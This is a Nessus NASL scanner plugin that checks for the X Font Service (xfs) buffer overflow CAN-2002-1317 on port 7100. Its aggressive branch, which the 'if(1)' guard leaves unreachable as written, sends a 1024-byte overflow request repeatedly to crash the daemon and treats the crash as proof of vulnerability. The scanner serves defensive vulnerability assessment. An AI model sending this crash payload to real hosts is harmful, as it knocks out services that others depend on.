#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#update by rd: 
#
# It turns out the initial revision of this script would *not* crash
# all versions of the font service.
#

if(description)
{
 script_id(11188);
 script_version ("$Revision: 1.3 $");
 script_cve_id("CAN-2002-1317");
 
 name["english"] = "X Font Service Buffer Overflow";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote X Font Service (xfs) is vulnerable to a buffer
overflow.

An attacker may use this flaw to gain root on this host
remotely.

Solution : See CERT Advisory CA-2002-34
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the remote XFS daemon";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 family["english"] = "Gain root remotely"; 

 script_family(english:family["english"]);
 script_require_ports(7100);
 exit(0);
}


include("misc_func.inc");

kb = known_service(port:7100);
if(kb && kb != "xfs")exit(0);


port = 7100;

if(1) # safe_checks()
{
 if(get_port_state(port))
 {
  soc = open_sock_tcp(port);
  if(soc)
  { 
   close(soc);
   report = "
The remote X Font Service (xfs) might be vulnerable to a buffer
overflow.

An attacker may use this flaw to gain root on this host
remotely.

*** Note that Nessus did not actually check for the flaw
*** as details about this vulnerability are still unknown

Solution : See CERT Advisory CA-2002-34
Risk factor : High";
   security_hole(port:port, data:report);
  }
 }
 exit(0);
}


# Safe checks are disabled - let's be nasty.

req = string("B", raw_string(0x00, 0x02), crap(1024));

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 send(socket:soc, data:req);
 close(soc);
 
 # We might need to re-try the attack up to ten times
 
  for(i = 0 ; i < 10 ; i = i + 1)
  {
  soc = open_sock_tcp(port);
  if(soc)
  { 
  send(socket:soc, data:req);
  close(soc);
  } else { security_hole(port); exit(0); }
 }
}
